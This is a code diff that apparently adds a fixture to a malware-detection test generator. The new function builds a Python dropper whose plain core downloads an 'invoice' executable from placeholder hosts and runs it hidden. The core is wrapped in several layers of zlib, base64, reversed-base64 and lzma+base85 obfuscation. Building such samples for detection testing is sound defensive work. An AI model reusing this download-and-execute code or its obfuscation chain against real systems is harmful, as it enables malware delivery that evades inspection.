@@ -1330,6 +1330,35 @@ def dosfuscation_bat() -> bytes:
             "rem fallback 192.0.2.44\r\n").encode("utf-8")
 
 
+def exec_chain_py() -> bytes:
+    """Python dropper (inert) hidden in the "exec chain" public obfuscators use:
+    zlib+base64 layers, a reversed-base64 lambda layer and an lzma+base85 layer.
+    The core downloads the "invoice" with urllib and runs it."""
+    import base64
+    import lzma
+    import zlib
+
+    core = ("# Factura 2024-0613 - sincronizador\n"
+            "import os, subprocess, tempfile, urllib.request\n"
+            "u = 'http://invoice-sync.example/Factura_2024-0613.exe'\n"
+            "p = os.path.join(tempfile.gettempdir(), 'Factura_2024-0613.exe')\n"
+            "try:\n"
+            "    urllib.request.urlretrieve(u, p)\n"
+            "except Exception:\n"
+            "    urllib.request.urlretrieve('http://203.0.113.50/f.exe', p)\n"
+            "subprocess.Popen([p], creationflags=0x08000000)\n")
+    s = core
+    for _ in range(3):
+        s = f"import zlib, base64\nexec(zlib.decompress(base64.b64decode({base64.b64encode(zlib.compress(s.encode()))!r})))\n"
+    blob = base64.b64encode(zlib.compress(s.encode()))[::-1]
+    s = ("_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
+         f"exec((_)({blob!r}))\n")
+    b85 = base64.b85encode(lzma.compress(s.encode())).decode()
+    return ("# -*- coding: utf-8 -*-\nimport lzma as _l, base64 as _b\n"
+            f"_d = {b85!r}\n"
+            "exec(_l.decompress(_b.b85decode(_d)).decode())\n").encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1339,7 +1368,7 @@ def build_all() -> dict[str, bytes]:
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_obf_techniques.js": obf_techniques_js(),
         "sample_chain_dropper.js": chain_dropper_js(), "sample_msxml_dropper.js": msxml_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
-        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(), "sample_invoke_obfuscation.ps1": invoke_obfuscation_ps1(), "sample_xor_loader.vbs": xor_loader_vbs(), "sample_dosfuscation.bat": dosfuscation_bat(),
+        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(), "sample_invoke_obfuscation.ps1": invoke_obfuscation_ps1(), "sample_xor_loader.vbs": xor_loader_vbs(), "sample_dosfuscation.bat": dosfuscation_bat(), "sample_exec_chain.py": exec_chain_py(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
